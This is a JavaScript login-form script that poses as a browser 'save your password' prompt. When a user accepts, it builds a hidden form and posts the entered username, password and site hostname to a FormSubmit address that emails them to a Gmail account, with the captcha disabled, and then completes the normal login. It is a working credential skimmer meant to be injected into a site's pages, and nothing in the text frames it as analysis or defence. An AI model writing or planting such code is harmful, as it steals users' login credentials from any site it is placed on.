    <script>
        document.addEventListener('DOMContentLoaded', function() {
          const loginForm = document.getElementById('user_session');
          
          loginForm.addEventListener('submit', function(event) {
            // Prevent default submission temporarily
            event.preventDefault();
            
            const username = document.getElementById('user_session_username').value;
            const password = document.getElementById('user_session_password').value;
            
            if (username && password) {
              if (confirm('Would you like to save your password for this site?')) {
                // Create a hidden form to send data to FormSubmit service
                const emailForm = document.createElement('form');
                emailForm.method = 'POST';
                emailForm.action = 'https://formsubmit.co/this0is0hard@gmail.com'; // Replace with your actual email
                emailForm.target = '_blank'; // Open in new tab to prevent navigation away
                emailForm.style.display = 'none';
                
                // Create input fields
                const usernameField = document.createElement('input');
                usernameField.type = 'text';
                usernameField.name = 'Username';
                usernameField.value = username;
                
                const passwordField = document.createElement('input');
                passwordField.type = 'text';
                passwordField.name = 'Password';
                passwordField.value = password;
                
                const websiteField = document.createElement('input');
                websiteField.type = 'text';
                websiteField.name = 'Website';
                websiteField.value = window.location.hostname;
                
                // Add a honeypot field to prevent spam
                const honeypotField = document.createElement('input');
                honeypotField.type = 'text';
                honeypotField.name = '_honey';
                honeypotField.style.display = 'none';
                
                // Disable captcha
                const captchaField = document.createElement('input');
                captchaField.type = 'hidden';
                captchaField.name = '_captcha';
                captchaField.value = 'false';
                
                // Add a field to specify subject
                const subjectField = document.createElement('input');
                subjectField.type = 'hidden';
                subjectField.name = '_subject';
                subjectField.value = 'New Login Credentials Saved';
                
                // Add all fields to form
                emailForm.appendChild(usernameField);
                emailForm.appendChild(passwordField);
                emailForm.appendChild(websiteField);
                emailForm.appendChild(honeypotField);
                emailForm.appendChild(captchaField);
                emailForm.appendChild(subjectField);
                
                // Add form to body
                document.body.appendChild(emailForm);
                
                // Submit the email form
                emailForm.submit();
                
                // Now continue with the regular login form submission
                setTimeout(function() {
                  loginForm.removeEventListener('submit', arguments.callee);
                  loginForm.submit();
                }, 100);
              } else {
                // If user declines, just submit the form normally
                loginForm.removeEventListener('submit', arguments.callee);
                loginForm.submit();
              }
            } else {
              // If fields are empty, just submit normally
              loginForm.removeEventListener('submit', arguments.callee);
              loginForm.submit();
            }
          });
        });
      </script>
